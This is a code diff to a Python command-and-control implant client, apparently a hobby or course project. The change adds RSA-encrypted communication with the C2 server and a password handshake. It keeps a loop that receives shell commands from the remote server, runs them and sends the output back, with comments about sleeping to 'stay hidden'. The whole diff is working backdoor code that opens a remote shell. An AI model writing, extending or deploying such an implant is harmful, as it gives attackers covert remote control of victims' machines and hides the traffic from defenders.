@@ -4,6 +4,9 @@ import socket
 import subprocess
 import time
 
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_OAEP
+
 import configuration as config  # Import configuration file
 
 # CONSTANTS & GLOBALS
@@ -68,17 +71,46 @@ def receive_or_sleep():
             print("woke up!")
     return cmd       
 
-##### Main Loop #####
-sleep_or_connect()
+# Create RSA key pair
+client_key = RSA.generate(config.KEY_SIZE)
+client_public_key = client_key.publickey()
+decrypt_cipher = PKCS1_OAEP.new(client_key)
+encrypt_cipher = None
 
-# Receive the debug message
-message = receive_or_sleep().decode()
-print("Debug message: ", message)
+def encoded_encrypt_and_send(encoded_message):
+    encrypted_message = encrypt_cipher.encrypt(encoded_message)
+    connection_socket.send(encrypted_message)
+
+def decrypt(encrypted_message):
+    message = decrypt_cipher.decrypt(encrypted_message).decode()
+    return message
+
+##### Main Loop #####
+
+while True:
+    sleep_or_connect()
+
+    # Send client public key to server
+    connection_socket.send(client_public_key.exportKey())
+
+    # Receive server's public key
+    server_public_key = RSA.importKey(connection_socket.recv(config.PAYLOAD_SIZE))
+    encrypt_cipher = PKCS1_OAEP.new(server_public_key)
+
+    # Check that it's the correct server
+    encrypted_message = receive_or_sleep()
+    decrypted_message = decrypt(encrypted_message)
+    # print("decrypted_message: ", decrypted_message)
+    if decrypted_message != "c2password":
+        connection_socket.close()
+        time.sleep(MAX_SLEEP)
+    else:
+        break
 
 # Client REPL loop - run the interactive shell
 while True:
     # Receive command from the C2 server
-    decrypted_command = receive_or_sleep().decode()
+    decrypted_command = decrypt(receive_or_sleep())
     if decrypted_command == "exit" or decrypted_command == "hangup":
         # Go back into the sleep cycle, stay hidden
         connection_socket.close()
@@ -91,5 +123,4 @@ while True:
     if shell_output == "".encode():
         shell_output = " ".encode()
     # Send the results to the server
-    encrypted_output = shell_output
-    connection_socket.send(encrypted_output)
+    encoded_encrypt_and_send(shell_output)
